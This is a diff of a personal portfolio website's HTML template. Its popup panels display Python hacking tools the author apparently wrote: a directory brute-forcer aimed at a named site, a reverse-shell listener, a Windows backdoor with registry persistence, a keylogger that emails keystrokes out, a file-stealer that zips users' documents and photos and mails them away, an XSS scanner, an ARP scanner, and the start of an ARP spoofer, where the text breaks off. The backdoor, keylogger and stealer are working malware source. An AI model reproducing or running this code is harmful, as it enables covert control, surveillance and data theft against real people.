+        with open ("files-and-dirs.txt", "r") as wordlist:
+            for word in wordlist:
+                word = word.strip()
+                test_url = "http://" + dir_url + "/" + word
+                # print(test_url)
+                result = get_response(test_url)
+
+                if result:
+                    print("[+] Discovered subdirectory --> " + test_url)
+
+
+        url = "https://carzone-p58h.onrender.com"
+        link_list = []
+        def get_href_links(url):
+            content = requests.get(url)
+            links = re.findall('(?:href=")(.*?)"', str(content.content))
+            return links
+
+        def crawl(url):
+            links = get_href_links(url)
+            for link in links:
+                link = urllib.parse.urljoin(url, link)
+                if "#" in link:
+                    link = link.split("#")[0]
+                if url in link and link not in link_list:
+                    link_list.append(link)
+                    print(link)
+                    crawl(link)
+
+        crawl(url)
+
+      </pre>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup6">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup6">&times;</span>
+      <pre id="popup2Content">
+
+        <--------------------------------- PORT LISTENER ------------------------------------>
+
+        #!usr/bin/env python3
+        import json
+        import socket
+        import base64
+
+
+        class Listener:
+            def __init__(self, ip, port):
+                listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                listener.bind((ip, port))
+
+                listener.listen(0)
+                print("Listening to any port 4444")
+                self.connection, address = listener.accept()
+                print("Connection Established")
+
+
+            def execute(self, command):
+                # self.connection.send(bytes(command.encode()))
+                self.reliable_send(command)
+                if command[0] == "exit":
+                    self.connection.close()
+                    exit()
+
+                return self.reliable_recv()
+                # print("RECEIVED" + received_data)
+
+            def write_file(self, path, content):
+                with open(path, "wb") as new_file:
+                    new_file.write(base64.b64decode(content))
+                    print("[+] Download Successful.")
+
+            def read_file(self, path):
+                with open(path, "rb") as file:
+                    file_content = base64.b64encode(file.read())
+                    file_str = file_content.decode()
+                    return file_str
+
+
+            def reliable_send(self, data):
+                json_data = json.dumps(data)
+
+                self.connection.send(bytes(json_data.encode()))
+
+            def reliable_recv(self):
+
+                # json_data = self.connection.recv(1024)
+                # json_data = json_data.decode('utf-8')
+                # return json.loads(json_data)
+                json_data = b""
+                while True:
+                    try:
+                        json_data = json_data + self.connection.recv(1024)
+                        # print("JSOOONNNN" + json_data)
+                        # json_data = json_data.decode('utf-8')
+                        return json.loads(json_data)
+
+                    except ValueError:
+                        continue
+
+
+            def run(self):
+                while True:
+                    # dlcommand = input(">> ")
+                    command = input(">> ")
+                    command = command.split(" ")
+                    if command[0] == "ul":
+                        file_content = self.read_file(command[1])
+                        command.append(file_content)
+                    result = self.execute(command)
+
+
+                    # self.connection.send(dlcommand)
+                    # result = self.connection.recv(1024)
+                    if command[0] == "dl":
+                        self.write_file(command[1], result)
+
+
+
+                    else:
+                        print(result)
+
+
+        my_listener = Listener("192.168.1.160", 4444)
+        my_listener.run()
+
+
+
+
+      </pre>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup7">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup7">&times;</span>
+      <pre id="popup2Content">
+
+        <--------------------------------- REMOTE BACKDOOR --------------------------------->
+
+
+        # -*- coding: utf-8 -*-
+
+        import socket
+        import subprocess
+        import re, json
+        import os
+        import base64
+        import sys
+        import shutil
+
+        class Backdoor:
+            def __init__(self, ip, port):
+                self.persist_exec()
+                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.connection.connect((ip, port))
+                # connection.send(b"\nConnected\n")
+
+            def persist_exec(self):
+                file_loc = os.environ["Appdata"] + "\\winload64.exe"
+                if not os.path.exists(file_loc):
+                    shutil.copyfile(sys.executable, file_loc)
+                    subprocess.call("reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d '"+ file_loc +"'")
+                    print("REGEDIT SUCCESSFUL")
+
+            def execute_command(self, command):
+                command_result =  command_result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+                return (command_result.decode('utf-8'))
+
+            def change_working_directory(self, path):
+                os.chdir(path)
+                return "[+] Changing working directory to '" + path +"'"
+
+            def write_file(self, path, content):
+                with open(path, "wb") as new_file:
+                    new_file.write(base64.b64decode(content))
+                    print("[+] Upload Successful.")
+
+
+            def read_file(self, path):
+                with open (path, "rb") as file:
+                    file_content = base64.b64encode(file.read())
+                    print(type(file_content))
+                    file_str = file_content.decode()
+                    # print(file_str)
+                    return file_str
+
+
+            def reliable_send(self, data):
+                json_data = json.dumps(data)
+                # json_data = json_data.decode('utf-8')
+                self.connection.send(bytes(json_data.encode()))
+
+
+            def reliable_recv(self):
+                json_data = b""
+                while True:
+                    try:
+                        json_data = json_data + self.connection.recv(1024)
+                        return json.loads(json_data)
+                    except ValueError:
+                        continue
+
+            def run(self):
+                while True:
+
+                    command = self.reliable_recv()
+                    try:
+                        res = ""
+                        for i in range(len(command)):
+
+                            if i == 0:
+                                res += str(command[i])
+                            else:
+                                res += " " + str(command[i])
+
+                        if command[0] == "exit":
+                            self.connection.close()
+                            sys.exit()
+                        elif command[0] == "cd" and len(command) > 1:
+                            print(command[1])
+                            command_result = self.change_working_directory(command[1])
+                        elif command[0] == "dl":
+                            command_result = self.read_file(command[1])
+                        elif command[0] == "ul":
+                            command_result = self.write_file(command[1], command[2])
+                            print("[+] File Created.")
+                        else:
+                            command_result = self.execute_command(str(res))
+                    except Exception:
+                        command_result = "[!] Error during command execution, please recheck!"
+                    # print("COMMANDDDDDDDDDDDDDDDDD" + (str(res[1])))
+                    # commandre = re.search("(?:b')(.*)", str(command))
+                    # commandd = commandre.group(1)
+                    # final_command = commandd.replace("'","")
+                    # final_command = commandd.replace('""','')
+                    # print(final_command)
+                    # self.connection.send(command_result)
+                    self.reliable_send(command_result)
+                    print(command_result)
+
+        # front_file = sys._MEIPASS + "\Vecteezy-License-Information.pdf"
+        # subprocess.Popen(front_file, shell=True)
+
+        try:
+            my_backdoor = Backdoor("192.168.1.145", 4444)
+            my_backdoor.run()
+
+        except Exception:
+            sys.exit()
+
+      </pre>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup8">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup8">&times;</span>
+      <pre id="popup2Content">
+
+        <--------------------------------- KEYLOGGER --------------------------------->
+
+
+        #!usr/bin/env python3
+        import pynput.keyboard
+        import smtplib, threading
+        import sys
+
+        class KeyLogger:
+
+            def __init__(self, time_interval, email, password):
+                self.log = "Keylogger Started, sending report every " + str(time_interval/60) + " minutes."
+                self.interval = time_interval
+                self.email = email
+                self.password = password
+
+            def append_log(self, string):
+                self.log = self.log + string
+                if "143" in self.log:
+                    self.stop()
+
+            def keylog(self, key):
+
+                try:
+                    current_key = str(key.char)
+                    print(current_key)
+
+                except AttributeError:
+
+                    if key == key.space:
+                        current_key = " "
+                    else:
+                        current_key = " " + str(key) + " "
+                self.append_log(current_key)
+
+            def send_mail(self, email, password, message):
+                server = smtplib.SMTP("smtp.gmail.com", 587)
+                server.starttls()
+                server.login(email, password)
+                server.sendmail(email, email, message)
+
+            def report(self):
+                print(self.log)
+                self.send_mail(self.email, self.password, self.log)
+                if "143" not in self.log:
+                    self.log = ""
+                    timer = threading.Timer(self.interval, self.report)
+                    timer.start()
+                else:
+                    quit(self.report)
+
+            def stop(self):
+                self.send_mail(self.email, self.password, "[!] Reporting Terminated.")
+                print("[!] Reporting Terminated.")
+                exit(KeyLogger)
+
+
+
+            def start(self):
+                keyboard_listener = pynput.keyboard.Listener(on_press=self.keylog)
+                with keyboard_listener:
+                    self.report()
+                    keyboard_listener.join()
+
+      </pre>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup9">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup9">&times;</span>
+      <pre id="popup2Content">
+
+        <--------------------------------- FILE GETTER --------------------------------->
+
+
+        import subprocess
+        import os
+        import smtplib
+        import re
+        import tempfile
+        import sys
+        from email.mime.text import MIMEText
+        from email.mime.multipart import MIMEMultipart
+        from email.mime.base import MIMEBase
+        from email import encoders
+
+
+        class Getter:
+
+
+            def __init__(self):
+                self.get_dirs()
+                self.set_mime_parameter()
+                self.doc_file_types = ["doc", "docm", "docx", "txt", "dotx", "eml", "pdf", "ppt", "pptx", "rtf"]
+                self.graphic_file_types = ["jpg", "jpeg", "psd", "png", "heic", "raw" ]
+                self.get_sys_info()
+                self.temp_dir = tempfile.gettempdir()
+
+
+            def get_other_drives(self):
+                drive_result = subprocess.check_output("wmic logicaldisk get deviceid, description", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+                # print(drive_result.decode())
+                drive_list = re.findall("(?:Local Fixed Disk\s*)(.):", drive_result.decode())
+                drive_list.remove("C")
+                # drive_list.remove("D")
+                # drive_list.remove("E")
+                # drive_list.remove("F")
+                # drive_list.remove("G")
+                return drive_list
+
+
+            def set_mime_parameter(self):
+                self.msg = MIMEMultipart()
+                self.msg['Subject'] = "Email from: " + self.uid
+                self.msg['From'] = self.uid
+                self.msg['To'] = ""
+
+
+            def send_mail(self, email, password, message):
+                self.server = smtplib.SMTP("smtp.gmail.com", 587)
+                self.server.starttls()
+                self.server.login(email, password)
+                self.server.sendmail(email, email, message)
+
+
+            def mime_obj(self, content, file_name):
+                file = MIMEBase('application', 'octet-stream')
+                file.set_payload(content.read())
+                encoders.encode_base64(file)
+                file.add_header('Content-Disposition', "attachment; filename = " + file_name )
+                self.msg.attach(file)
+
+
+            def get_sys_info(self):
+                attach_info = ""
+                system_info = subprocess.check_output("systeminfo", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+                ip_info = subprocess.check_output("nslookup myip.opendns.com resolver1.opendns.com", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+                attach_info = system_info.decode() + ip_info.decode()
+                self.msg.attach(MIMEText(attach_info, 'plain'))
+
+
+            def get_dirs(self):
+                self.uid = os.getlogin()
+
+                documents = "C:/Users/" + self.uid + "/Documents/"
+                downloads = "C:/Users/" + self.uid + "/Downloads/"
+                pictures = "C:/Users/" + self.uid + "/Pictures/"
+                D = "D:"
+                E = "E:"
+                F = "F:"
+                G = "G:"
+                H = "H:"
+                I = "I:"
+                path_dict = {"Documents":documents, "Downloads":downloads, "Pictures":pictures, "D":D, "E":E, "F":F, "G":G, "H":H, "I":I}
+
+                return path_dict
+
+
+            def check_files(self, file_directory):
+
+                os.chdir(self.get_dirs().get(file_directory))
+                check_all_files = subprocess.check_output("dir /s /b /o:gn", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+
+                # print(check_all_files.decode('cp1252'))
+                found_files = re.findall("(?:"+ file_directory +".)(.*\..*)", check_all_files.decode(errors = "ignore"))
+                # print(found_files)
+                return found_files
+
+
+
+            def check_file_size(self, file_path):
+                file_path = file_path.replace("/","\\")
+                result = subprocess.check_output('dir "' + file_path +'"', shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+                file_size = re.findall("(?:File\(s\)\s*)(.*)bytes", result.decode())
+                for size in file_size:
+                    size = size.replace(",","")
+                return int(size)
+
+            def read_file(self, path):
+                try:
+                    attachment = open (path, "rb")
+                    return attachment
+                except PermissionError:
+                    return None
+
+            def zip_and_email(self, my_file_string, file_name, dts, file_types):
+                try:
+                    zip_name = file_types + "_from_" + dts + ".zip"
+                    zip_path = self.temp_dir + "\\" + zip_name
+                    # print(my_file_string)
+                    # print(zip_path)
+                    subprocess.call("tar -a -c -f " + zip_path +" "+ my_file_string, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+                    file_data = self.read_file(zip_path)
+                    # print(file_data)
+                    # print("[~] Sending zip as email...Please wait.")
+                    self.mime_obj(file_data, zip_name)
+                    file_data = None
+                    os.remove(zip_path)
+                    try:
+                        # ---- ENTER THE EMAIL YOU WANT TO USE FOLLOWED BY THE APP PASSWORD ----
+                        self.send_mail("%YOUR_EMAIL_HERE%", "%YOUR_APP_PASSWORD%", self.msg.as_string())
+                        self.set_mime_parameter()
+                    except Exception:
+                        self.set_mime_parameter()
+                        pass
+
+                except Exception:
+                    # print(traceback.format_exc())
+                    pass
+
+
+            def run(self):
+                dirs_to_scan = ["Documents", "Downloads", "Pictures"]
+                for drives in self.get_other_drives():
+                    dirs_to_scan.append(str(drives))
+                # print(dirs_to_scan)
+
+                my_gfile_string = ""
+                my_file_string = ""
+                append_gzip_name = 0
+                append_zip_name = 0
+                for dts in dirs_to_scan:
+                    full_file_path_result = self.check_files(dts)
+                    gtotal_size = 0
+                    total_size = 0
+                    count = 0
+
+                    for i in range(len(full_file_path_result)):
+                        count += 1
+                        file_length_count =  len(full_file_path_result)
+                        try:
+                            full_file_path_result[i] = full_file_path_result[i].replace("\r","")
+                            file_name = full_file_path_result[i].split("\\")[-1]
+
+                            ext = re.search("....\Z", file_name)
+
+                            for gtypes in self.graphic_file_types:
+                                if gtypes in ext.group():
+                                    if gtypes != "jpg" or ext.group() != "jpeg":
+                                        data = self.get_dirs().get(dts)+full_file_path_result[i]
+                                        if gtotal_size < 15000000:
+                                                gcurrent_size = self.check_file_size(data)
+                                                gtotal_size = gtotal_size + gcurrent_size
+                                                if gtotal_size and gcurrent_size < 20000000:
+                                                    my_gfile_string = my_gfile_string +'"' + data + '"' + " "
+                                                    # print(data)
+                                                    # print(gtotal_size)
+                                        else:
+                                            append_gzip_name = append_gzip_name + 1
+                                            self.zip_and_email(my_gfile_string, file_name, dts, "ImgFiles(" + str(append_gzip_name) + ")")
+
+                                            my_gfile_string = ""
+                                            gtotal_size = 0
+
+
+                            for dtypes in self.doc_file_types:
+                                if dtypes in ext.group() :
+                                    if dtypes != "doc" or ext.group() != "docx":
+                                        data = self.get_dirs().get(dts)+full_file_path_result[i]
+
+                                        if total_size < 15000000:
+                                                current_size = self.check_file_size(data)
+                                                total_size = total_size + current_size
+
+                                                if total_size and current_size < 20000000:
+                                                    my_file_string = my_file_string +'"' + data + '"' + " "
+                                                    # print(data)
+                                        else:
+                                            append_zip_name = append_zip_name + 1
+                                            self.zip_and_email(my_file_string, file_name, dts, "DocFiles(" + str(append_gzip_name) + ")")
+
+                                            my_file_string = ""
+                                            total_size = 0
+
+                        except Exception:
+                            # print(traceback.format_exc())
+                            continue
+
+                        finally:
+                            try:
+                                if count == file_length_count:
+                                    self.zip_and_email(my_gfile_string, file_name, dts, "ImgFiles(" + str(append_gzip_name) + ")")
+                                    self.zip_and_email(my_file_string, file_name, dts, "DocFiles(" + str(append_gzip_name) + ")")
+                                    my_gfile_string = ""
+                                    gtotal_size = 0
+                                    my_file_string = ""
+                                    total_size = 0
+                                    append_gzip_name = 0
+                                    append_zip_name = 0
+                            except Exception:
+                                # print(traceback.format_exc())
+                                my_gfile_string = ""
+                                gtotal_size = 0
+                                my_file_string = ""
+                                total_size = 0
+                                append_gzip_name = 0
+                                append_zip_name = 0
+                                continue
+
+
+                self.server.quit()
+                sys.exit()
+                # print("DONE")
+
+
+
+        # --- UNCOMMENT THE LINES BELOW IF YOU WANT TO USE A FRONT FILE THAT WILL OPEN WHILE EXECUTING THIS SCRIPT AS EXECUTABLE (use command "--add-data" while repacking)----
+        # front_file = sys._MEIPASS + %FILE_NAME_HERE%
+        # subprocess.Popen(front_file, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+
+
+        try:
+            my_get = Getter()
+            my_get.run()
+
+        except Exception:
+            sys.exit()
+
+
+      </pre>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup10">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup10">&times;</span>
+      <pre id="popup2Content">
+
+        <--------------------------------- VULNERABILITY SCANNER --------------------------------->
+
+        #!usr/bin/python/env
+
+        import requests
+        import re
+        import urllib.parse as urlparse
+        from bs4 import BeautifulSoup
+
+        def request(url):
+            try:
+                req = requests.get(url)
+                if req.status_code == requests.codes.ok:
+                    print(requests.get(url))
+                    return req
+            except requests.exceptions.ConnectionError:
+                pass
+
+        class Scanner:
+
+            def __init__(self, url, ignore_links):
+                self.target_url = url
+                self.link_list = []
+                self.session = requests.Session()
+                self.ignore_links = ignore_links
+            def get_href_links(self ,url):
+                content = self.session.get(url)
+                links = re.findall('(?:href=")(.*?)"', str(content.content))
+                return links
+
+            def crawl(self, url=None):
+                if url==None:
+                    url = self.target_url
+                links = self.get_href_links(url)
+                for link in links:
+                    link = urlparse.urljoin(url, link)
+                    if "#" in link:
+                        link = link.split("#")[0]
+                    if url in link and link not in self.link_list and link not in self.ignore_links:
+                        self.link_list.append(link)
+                        print(link)
+                        self.crawl(link)
+
+            def extract_forms(self, url):
+
+                response = self.session.get(url)
+
+                parsed_html = BeautifulSoup(response.content, features="lxml")
+                forms_list = parsed_html.findAll("form")
+                return forms_list
+
+            def submit_form(self, form, value, url):
+
+
+                action = form.get("action")
+                post_url = urlparse.urljoin(url, action)
+                method = form.get("method")
+                # print(action)
+                # print(method)
+                inputs_list = form.findAll("input")
+                # print(inputs_list)
+                post_data = {}
+                for input in inputs_list:
+                    input_name = input.get("name")
+                    input_type = input.get("type")
+                    input_value = input.get("value")
+                    # print(input_value, input_name, input_type)
+                    if input_type == "text":
+                        input_value = value
+                    post_data[input_name] = input_value
+                if method == "post":
+                    print("POSSSSTTT")
+                    return self.session.post(post_url, data=post_data)
+                return self.session.get(post_url, params=post_data)
+
+
+            def run_scan(self):
+
+                for link in self.link_list:
+
+                    forms = self.extract_forms(link)
+                    for form in forms:
+                        is_xss_in_form = self.test_xss_in_form(link, form)
+                        # print(link)
+                        # print(form)
+                        # print(is_xss_in_form)
+                        if is_xss_in_form:
+                            print("\n\n[***] Discovered xss vulnerability in " + str(form))
+
+                    if "=" in link:
+                        is_xss_in_link = self.test_xss_in_link(link)
+                        if is_xss_in_link:
+                            print("\n\n[***] Discovered xss vulnerability in " + link)
+
+            def test_xss_in_link(self, url):
+                test_script = "TEST"
+                url = url.replace("=", "=" + test_script)
+                response = self.session.get(url)
+                return test_script in response.content.decode()
+
+            def test_xss_in_form(self, url, form):
+                # print(url)
+                # print(form)
+                test_script = "TEST"
+                response = self.submit_form(form, test_script, url)
+                # print(response.content.decode())
+                return test_script in response.content.decode()
+
+      </pre>
+    </div>
+  </div>
+<center>
+  <iframe id="iframe1" class="hover-iframe" src="https://www.youtube.com/embed/cvnzPCGGD" width ="1000px" height="800px"></iframe>
+  <iframe id="iframe2" class="hover-iframe" src="https://www.youtube.com/embed/pZyMxhDTi" width ="1000px" height="800px"></iframe>
+</center>
+</div>
+
+
+    <div class="col-lg-12 col-md-12 portfolio-item filter-others">
+      <div class="pcontainer">
+      <div class="pimage-frame">
+       <div class="pslider-container">
+         <div class="pslider">
+           <img class="pimg" src="{% static 'jake_portfolio/assets/img/portfolio/color_typer1.jpg' %}" alt="Image 1">
+           <img class="pimg" src="{% static 'jake_portfolio/assets/img/portfolio/color_typer2.jpg' %}" alt="Image 2">
+           <img class="pimg" src="{% static 'jake_portfolio/assets/img/portfolio/color_typer3.jpg' %}" alt="Image 3">
+           <img class="pimg"  src="{% static 'jake_portfolio/assets/img/portfolio/color_typer4.jpg' %}" alt="Image 4">
+           <img class="pimg" style="min-width:270px" src="{% static 'jake_portfolio/assets/img/portfolio/colorgif1.gif' %}" alt="gImage 5">
+           <img class="pimg" style="min-width:270px" src="{% static 'jake_portfolio/assets/img/portfolio/colorgif2.gif' %}" alt="gImage 6">
+           <!-- Add more images as needed -->
+         </div>
+         <div class="pthumbnails">
+           <img class="pimg" src="{% static 'jake_portfolio/assets/img/portfolio/color_typer1.jpg' %}" alt="Thumbnail 1" data-index="0">
+       <img class="pimg" src="{% static 'jake_portfolio/assets/img/portfolio/color_typer2.jpg' %}" alt="Thumbnail 2" data-index="1">
+       <img class="pimg" src="{% static 'jake_portfolio/assets/img/portfolio/color_typer3.jpg' %}" alt="Thumbnail 3" data-index="2">
+       <img class="pimg" src="{% static 'jake_portfolio/assets/img/portfolio/color_typer4.jpg' %}" alt="Thumbnail 4" data-index="3">
+       <img class="pimg"  src="{% static 'jake_portfolio/assets/img/portfolio/colorgif1.gif' %}" alt="Thumbnail 5" data-index="4">
+       <img class="pimg"  src="{% static 'jake_portfolio/assets/img/portfolio/colorgif2.gif' %}" alt="Thumbnail 5" data-index="5">
+           <!-- Add more thumbnails as needed -->
+         </div>
+       </div>
+       </div>
+        <div class="pdescription-area">
+           <center><h2>Color Typer</h2></center>
+         </div>
+       </div><hr>
+
+       <div class="gcontainer">
+       <div class="gimage-frame">
+        <div class="gslider-container">
+          <div class="gslider">
+            <img class="gimg" src="{% static 'jake_portfolio/assets/img/portfolio/garatopia1.png' %}" alt="gImage 1">
+       <img class="gimg" src="{% static 'jake_portfolio/assets/img/portfolio/garatopia2.png' %}" alt="gImage 2">
+       <img class="gimg" src="{% static 'jake_portfolio/assets/img/portfolio/garatopia3.png' %}" alt="gImage 3">
+       <img class="gimg"  src="{% static 'jake_portfolio/assets/img/portfolio/garatopia4.png' %}" alt="gImage 4">
+        <img class="gimg"  src="{% static 'jake_portfolio/assets/img/portfolio/garatopia6.png' %}" alt="gImage 5">
+        <img class="gimg"  style="min-width:540px; max-height:380px; align:center;" src="{% static 'jake_portfolio/assets/img/portfolio/garatopia.gif' %}" alt="gImage 6">
+            <!-- Add more images as needed -->
+          </div>
+          <div class="gthumbnails">
+            <img class="gimg" src="{% static 'jake_portfolio/assets/img/portfolio/garatopia1.png' %}" alt="gThumbnail 1" data-index="0">
+        <img class="gimg" src="{% static 'jake_portfolio/assets/img/portfolio/garatopia2.png' %}" alt="gThumbnail 2" data-index="1">
+        <img class="gimg" src="{% static 'jake_portfolio/assets/img/portfolio/garatopia3.png' %}" alt="gThumbnail 3" data-index="2">
+        <img class="gimg" src="{% static 'jake_portfolio/assets/img/portfolio/garatopia4.png' %}" alt="gThumbnail 4" data-index="3">
+          <img class="gimg"  src="{% static 'jake_portfolio/assets/img/portfolio/garatopia6.png' %}" alt="gThumbnail 5" data-index="4">
+            <img class="gimg"  src="{% static 'jake_portfolio/assets/img/portfolio/garatopia.gif' %}" alt="gThumbnail 5" data-index="5">
+            <!-- Add more thumbnails as needed -->
+          </div>
+        </div>
+        </div>
+         <div class="pdescription-area">
+             <center><h2>Garatopia Chronicles</h2></center>
           </div>
         </div>
 
-        <div class="col-lg-4 col-md-6 portfolio-item filter-web">
-          <div class="portfolio-wrap">
-            <img src="assets/img/portfolio/portfolio-2.jpg" class="img-fluid" alt="">
-            <div class="portfolio-info">
-              <h4>Web 3</h4>
-              <p>Web</p>
-              <div class="portfolio-links">
-                <a href="assets/img/portfolio/portfolio-2.jpg" data-gallery="portfolioGallery" class="portfolio-lightbox" title="Web 3"><i class="bx bx-plus"></i></a>
-                <a href="portfolio-details.html" data-gallery="portfolioDetailsGallery" data-glightbox="type: external" class="portfolio-details-lightbox" title="Portfolio Details"><i class="bx bx-link"></i></a>
-              </div>
-            </div>
-          </div>
-        </div>
 
-        <div class="col-lg-4 col-md-6 portfolio-item filter-app">
-          <div class="portfolio-wrap">
-            <img src="assets/img/portfolio/portfolio-3.jpg" class="img-fluid" alt="">
-            <div class="portfolio-info">
-              <h4>App 2</h4>
-              <p>App</p>
-              <div class="portfolio-links">
-                <a href="assets/img/portfolio/portfolio-3.jpg" data-gallery="portfolioGallery" class="portfolio-lightbox" title="App 2"><i class="bx bx-plus"></i></a>
-                <a href="portfolio-details.html" data-gallery="portfolioDetailsGallery" data-glightbox="type: external" class="portfolio-details-lightbox" title="Portfolio Details"><i class="bx bx-link"></i></a>
-              </div>
-            </div>
-          </div>
-        </div>
 
-        <div class="col-lg-4 col-md-6 portfolio-item filter-card">
-          <div class="portfolio-wrap">
-            <img src="assets/img/portfolio/portfolio-4.jpg" class="img-fluid" alt="">
-            <div class="portfolio-info">
-              <h4>Card 2</h4>
-              <p>Card</p>
-              <div class="portfolio-links">
-                <a href="assets/img/portfolio/portfolio-4.jpg" data-gallery="portfolioGallery" class="portfolio-lightbox" title="Card 2"><i class="bx bx-plus"></i></a>
-                <a href="portfolio-details.html" data-gallery="portfolioDetailsGallery" data-glightbox="type: external" class="portfolio-details-lightbox" title="Portfolio Details"><i class="bx bx-link"></i></a>
-              </div>
-            </div>
-          </div>
-        </div>
 
-        <div class="col-lg-4 col-md-6 portfolio-item filter-web">
-          <div class="portfolio-wrap">
-            <img src="assets/img/portfolio/portfolio-5.jpg" class="img-fluid" alt="">
-            <div class="portfolio-info">
-              <h4>Web 2</h4>
-              <p>Web</p>
-              <div class="portfolio-links">
-                <a href="assets/img/portfolio/portfolio-5.jpg" data-gallery="portfolioGallery" class="portfolio-lightbox" title="Web 2"><i class="bx bx-plus"></i></a>
-                <a href="portfolio-details.html" data-gallery="portfolioDetailsGallery" data-glightbox="type: external" class="portfolio-details-lightbox" title="Portfolio Details"><i class="bx bx-link"></i></a>
-              </div>
-            </div>
-          </div>
-        </div>
 
-        <div class="col-lg-4 col-md-6 portfolio-item filter-app">
-          <div class="portfolio-wrap">
-            <img src="assets/img/portfolio/portfolio-6.jpg" class="img-fluid" alt="">
-            <div class="portfolio-info">
-              <h4>App 3</h4>
-              <p>App</p>
-              <div class="portfolio-links">
-                <a href="assets/img/portfolio/portfolio-6.jpg" data-gallery="portfolioGallery" class="portfolio-lightbox" title="App 3"><i class="bx bx-plus"></i></a>
-                <a href="portfolio-details.html" data-gallery="portfolioDetailsGallery" data-glightbox="type: external" class="portfolio-details-lightbox" title="Portfolio Details"><i class="bx bx-link"></i></a>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div class="col-lg-4 col-md-6 portfolio-item filter-card">
-          <div class="portfolio-wrap">
-            <img src="assets/img/portfolio/portfolio-7.jpg" class="img-fluid" alt="">
-            <div class="portfolio-info">
-              <h4>Card 1</h4>
-              <p>Card</p>
-              <div class="portfolio-links">
-                <a href="assets/img/portfolio/portfolio-7.jpg" data-gallery="portfolioGallery" class="portfolio-lightbox" title="Card 1"><i class="bx bx-plus"></i></a>
-                <a href="portfolio-details.html" data-gallery="portfolioDetailsGallery" data-glightbox="type: external" class="portfolio-details-lightbox" title="Portfolio Details"><i class="bx bx-link"></i></a>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div class="col-lg-4 col-md-6 portfolio-item filter-card">
-          <div class="portfolio-wrap">
-            <img src="assets/img/portfolio/portfolio-8.jpg" class="img-fluid" alt="">
-            <div class="portfolio-info">
-              <h4>Card 3</h4>
-              <p>Card</p>
-              <div class="portfolio-links">
-                <a href="assets/img/portfolio/portfolio-8.jpg" data-gallery="portfolioGallery" class="portfolio-lightbox" title="Card 3"><i class="bx bx-plus"></i></a>
-                <a href="portfolio-details.html" data-gallery="portfolioDetailsGallery" data-glightbox="type: external" class="portfolio-details-lightbox" title="Portfolio Details"><i class="bx bx-link"></i></a>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div class="col-lg-4 col-md-6 portfolio-item filter-web">
-          <div class="portfolio-wrap">
-            <img src="assets/img/portfolio/portfolio-9.jpg" class="img-fluid" alt="">
-            <div class="portfolio-info">
-              <h4>Web 3</h4>
-              <p>Web</p>
-              <div class="portfolio-links">
-                <a href="assets/img/portfolio/portfolio-9.jpg" data-gallery="portfolioGallery" class="portfolio-lightbox" title="Web 3"><i class="bx bx-plus"></i></a>
-                <a href="portfolio-details.html" data-gallery="portfolioDetailsGallery" data-glightbox="type: external" class="portfolio-details-lightbox" title="Portfolio Details"><i class="bx bx-link"></i></a>
-              </div>
-            </div>
-          </div>
-        </div>
-
-      </div>
 
     </div>
+  </div>
+
+  <div class="popup-overlay" id="popup2">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup2">&times;</span>
+      <pre id="popup2Content">
+
+        <--------------------------------- NETWORK SCANNER ------------------------------------>
+
+
+        #!usr/bin/python/env
+
+        import scapy.all as scapy
+        import scapy.layers.l2 as scapyA
+        import optparse
+
+
+        def get_arguments():
+            parser = optparse.OptionParser()
+            parser.add_option("-t", "--target", dest="target", help="Target IP/Client")
+            options = parser.parse_args()[0]
+            return options
+
+        def scan(ip):
+            arp_request = scapyA.ARP(pdst=ip)
+            broadcast = scapyA.Ether(dst="ff:ff:ff:ff:ff:ff")
+            # scapy.ls(scapyA.ARP())
+            arp_broadcast_request = broadcast/arp_request
+            answered_list = scapyA.srp(arp_broadcast_request, timeout=1)[0]
+            # print(answered.summary())
+
+
+            client_list=[]
+            for e in answered_list:
+                # print(e)
+                # print(e[1].psrc+"\t\t"+e[1].hwsrc)
+                client_dict={"IP":e[1].psrc, "MAC Address":e[1].hwsrc}
+                client_list.append(client_dict)
+                # print("================================+++++++++++++++++++++++++++++++++++++++++++===============================")
+
+            return(client_list)
+        def print_result(result_list):
+            print("IP\t\t\tMAC Address\n=======================================================================================")
+            for client in result_list:
+                print(client["IP"]+"\t\t"+client["MAC Address"])
+
+        target_client = get_arguments()
+        scan_result = scan(target_client.target)
+        print_result(scan_result)
+      </pre>
+    </div>
+  </div>
+
+  <div class="popup-overlay" id="popup3">
+    <div class="popup-content">
+      <span class="close-button" data-popup-id="popup3">&times;</span>
+      <pre id="popup2Content">
+
+        <--------------------------------- ARP SPOOFER ------------------------------------>
+
+
+        #!usr/bin/python/env
+        import sys
+        import scapy.all as scapy
+        import scapy.layers.l2 as scapyA
+        import optparse
+        import time
+        import os
+
+        def spoof(target_IP, spoof_IP):
+            target_mac = get_mac((target_IP))
+            packet = scapyA.ARP(op=2, pdst=target_IP, hwdst=target_mac, psrc=spoof_IP)
+            print(target_mac+"\n")
+            scapy.send(packet, verbose=False)
+
+        def restore(dest_IP, source_IP):
+            dest_MAC = get_mac((dest_IP))
+            source_MAC = get_mac(source_IP)
